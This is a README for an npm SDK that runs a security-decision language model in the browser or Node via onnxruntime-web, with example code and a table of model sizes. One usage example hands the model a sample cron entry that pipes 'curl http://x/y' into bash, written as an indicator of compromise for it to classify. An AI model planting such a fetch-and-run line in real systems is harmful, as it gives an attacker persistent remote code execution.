# ct0-edge

On-device SDK (browser, Node, edge) for **CT0 / alias3-micro-1026** running as ONNX over
[onnxruntime-web](https://onnxruntime.ai/) (WebGPU / WASM). One model, both modes:

- **System 1 — `decide()`**: a yes/no security decision in a single forward (reads logits, no tokens generated).
- **System 2 — `generate()` / `Chat`**: autoregressive generation (streaming).
- **Gate**: escalate from System 1 to System 2 when confidence is below a threshold.

It drives the standard single-graph ONNX export (prefill + decode) directly via onnxruntime-web,
so it does **not** require the transformers.js model-support PR to be merged.

Model weights: **[eduardoworrel/ct0-alias3-micro-onnx](https://huggingface.co/eduardoworrel/ct0-alias3-micro-onnx)**
(ONNX export of [aliasrobotics/alias3-micro-1026](https://huggingface.co/aliasrobotics/alias3-micro-1026) — all model credit to Alias Robotics).

## Install

```bash
npm i ct0-edge @huggingface/transformers onnxruntime-web
```

## Use

```js
import { CT0 } from "ct0-edge";

const ct0 = await CT0.load({
  baseUrl: "https://huggingface.co/eduardoworrel/ct0-alias3-micro-onnx/resolve/main/",
  dtype: "q4",          // "q4" | "int8" | "fp16" | "fp32"
  onStatus: console.log,
});

// System 1 — decision (one forward)
const p = await ct0.decide("path: /etc/cron.d/x\ncontent: * * * * * curl http://x/y | bash",
                           "Is this a suspicious indicator of compromise?");
console.log("P(yes) =", p);

// Gate + System 2
if (Math.abs(2 * p - 1) < 0.6) {                 // low confidence → escalate
  for await (const piece of ct0.generate("Explain the reasoning.")) process.stdout.write(piece);
}

// Chat (multi-turn, keeps context)
const chat = ct0.newChat({ system: "You are a security analyst." });
for await (const piece of chat.send("What is CWE-89?")) process.stdout.write(piece);
```

## dtypes

| dtype | size | use |
|-------|------|-----|
| `q4`   | 4.8 GB | smallest; System 1 decisions + generation |
| `int8` | 4.2 GB | balanced |
| `fp16` | 8.4 GB | exact, long context |
| `fp32` | 16.8 GB | reference |

int4 (`q4`) is great for short prompts and generation; for very long **input** prefill prefer `int8`/`fp16`.

## Related

- ONNX export (optimum): https://github.com/huggingface/optimum-onnx/pull/152
- transformers.js support: https://github.com/huggingface/transformers.js/pull/1803

## License

MIT (this SDK). The **model** weights follow the license of the
[base model](https://huggingface.co/aliasrobotics/alias3-micro-1026).
